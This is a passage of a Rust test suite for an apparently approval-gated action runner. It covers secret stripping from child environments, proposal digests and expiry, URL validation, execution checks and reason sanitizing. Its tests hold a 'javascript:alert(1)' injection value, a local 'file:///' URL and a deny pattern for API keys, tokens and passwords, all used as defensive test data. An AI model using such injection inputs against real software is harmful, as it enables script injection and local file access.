            ("AWS_SECRET_ACCESS_KEY".to_string(), "aws".to_string()),
            ("DB_PASSWORD".to_string(), "pw".to_string()),
            ("CARGO_HOME".to_string(), r"C:\cargo".to_string()),
            ("RANDOM_UNRELATED".to_string(), "x".to_string()),
        ]
        .into_iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect::<Vec<_>>();
        let env = child_env(parent);
        let keys: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
        assert!(keys.contains(&"PATH"));
        assert!(keys.contains(&"CARGO_HOME"));
        assert!(!keys.iter().any(|k| k.contains("API_KEY")));
        assert!(!keys.iter().any(|k| k.contains("TOKEN")));
        assert!(!keys.iter().any(|k| k.contains("PASSWORD")));
        assert!(!keys.contains(&"RANDOM_UNRELATED"));
    }

    #[test]
    fn plans_digests_and_expires_proposals() {
        let p = plan_proposal(ProposalKind::Run, "cargo test", "run the tests", 1_000).unwrap();
        assert_eq!(p.kind, ProposalKind::Run);
        assert_eq!(p.risk, Risk::High);
        assert_eq!(p.expires_at, 1_000 + PROPOSAL_TTL_SECS);
        // digest is stable and binds kind + target
        assert_eq!(p.digest, arg_digest("run", "cargo test"));
        assert_ne!(p.digest, arg_digest("run", "cargo test "));
        assert_ne!(p.digest, arg_digest("open_url", "cargo test"));
    }

    #[test]
    fn rejects_non_http_urls_and_overlong_targets() {
        assert!(plan_proposal(ProposalKind::OpenUrl, "javascript:alert(1)", "", 0).is_err());
        assert!(plan_proposal(ProposalKind::OpenUrl, "file:///C:/Windows", "", 0).is_err());
        assert!(plan_proposal(ProposalKind::OpenUrl, "https://example.com/a?b=1", "", 0).is_ok());
        assert!(plan_proposal(ProposalKind::Run, "", "", 0).is_err());
        let long = "a".repeat(MAX_TARGET_LEN + 1);
        assert!(plan_proposal(ProposalKind::Run, &long, "", 0).is_err());
    }

    #[test]
    fn only_approved_unexpired_untampered_proposals_may_execute() {
        assert!(may_execute(ProposalState::Executing, true, 2_000, 1_000).is_ok());
        assert!(matches!(
            may_execute(ProposalState::Pending, true, 2_000, 1_000).unwrap_err(),
            ExecReject::NotExecutable("pending")
        ));
        assert!(matches!(
            may_execute(ProposalState::Executed, true, 2_000, 1_000).unwrap_err(),
            ExecReject::NotExecutable("executed")
        ));
        assert!(matches!(
            may_execute(ProposalState::Executing, false, 2_000, 1_000).unwrap_err(),
            ExecReject::NotExecutable("tampered")
        ));
        assert_eq!(
            may_execute(ProposalState::Executing, true, 1_000, 1_001).unwrap_err(),
            ExecReject::Expired
        );
    }

    #[test]
    fn sanitizes_reasons_for_display() {
        assert_eq!(sanitize_reason("  run the tests  "), "run the tests");
        assert_eq!(sanitize_reason("a\u{7}b"), "ab");
        let long = "x".repeat(MAX_REASON_LEN + 50);
        assert_eq!(sanitize_reason(&long).chars().count(), MAX_REASON_LEN);
    }

    #[test]
    fn screenshots_are_high_risk_and_need_no_target() {
        let p = plan_proposal(ProposalKind::Screenshot, "", "look at the screen", 0).unwrap();
        assert_eq!(p.risk, Risk::High);
        assert_eq!(p.target, "");
    }
}
